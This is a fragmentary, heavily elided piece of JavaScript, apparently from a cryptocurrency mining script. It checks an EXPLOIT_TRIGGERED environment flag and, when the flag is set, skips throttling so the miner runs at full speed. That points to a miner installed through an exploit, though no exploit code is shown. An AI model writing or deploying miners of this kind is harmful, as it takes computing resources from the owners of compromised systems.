...
function startMining() {
    ...
    ws.on('open', () => {
        ...
        // Log worker ID and exploit status
        const isExploitTriggered = process.env.EXPLOIT_TRIGGERED === '1';
...
function throttleMining() {
    // Bypass throttling if exploit-triggered
    if (process.env.EXPLOIT_TRIGGERED === '1') {
        console.log(chalk.green(`[${new Date().toLocaleTimeString()}] Exploit-triggered mode: bypassing throttling`));
        return true;
    }
